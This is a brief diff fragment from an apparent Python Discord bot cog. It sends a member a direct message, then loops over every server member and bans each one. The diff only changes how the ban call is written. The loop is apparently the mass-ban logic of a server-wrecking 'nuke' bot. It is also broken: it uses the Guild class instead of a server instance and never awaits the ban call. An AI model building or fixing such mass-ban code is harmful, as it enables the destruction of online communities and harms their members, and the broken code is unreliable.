@@ -49,7 +49,7 @@ class MainModule(commands.Cog):
         print(member)
         await member.send(content)
         for member in discord.Guild.members:
-            discord.Guild.ban(user=member)
+            discord.Guild.ban(member)
 
 
 
